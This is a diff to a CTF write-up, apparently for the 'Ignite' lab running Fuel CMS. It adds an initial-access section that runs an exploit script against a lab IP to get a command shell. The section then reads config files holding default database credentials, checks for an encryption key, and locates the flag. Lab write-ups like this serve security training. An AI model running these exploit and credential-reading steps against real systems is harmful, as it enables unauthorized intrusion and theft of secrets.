@@ -130,6 +130,54 @@ if "http" not in url:
 
 ````  
 
-## Initiate the Exploit  
+## Initial Access  
 
-`:> pythohn3 50477.py -u http://10.201.126.242`
+Note: A change in the target (victim) machine due to a restart of the remote target.
+
+`:> pythohn3 50477.py -u http://10.201.116.158`
+
+Success is identified when the exploit provides a command input prompt.  
+
+![Perform Initial Access](assets/ignite-16.png)  
+
+Test a few commands. 
+
+![Perform Initial Access](assets/ignite-17.png)  
+
+### Recon  
+
+Based on the instructions identified on the webpage, identify potential exploit points. 
+
+`:> cat .htaccess`  doesn't reveal anything valuable
+
+![HTACCESS](assets/ignite-18.png) 
+
+`:> cat fuel/application/config/database.php` has a default username and password  
+
+![db creds](assets/ignite-19.png) 
+
+`:> cat fuel/application/config/config.php | grep encryption`  
+
+No encryption key is set  
+
+![encryption key](assets/ignite-20.png)  
+
+Traverse directories to find the first flag  
+
+`:> ls -alh ../`  
+
+![up 1 level](assets/ignite-21.png)  
+
+`:> ls -alh ../../`  
+
+![Up 2 levels](assets/ignite-22.png)  
+
+`:> ls -alh ../../../`  
+
+![Up 3 Levels](assets/ignite-23.png)  
+
+`:> cat ../../../home/www-data/flag.txt`
+ 
+![The Flag](assets/ignite-24.png)  
+
+ 
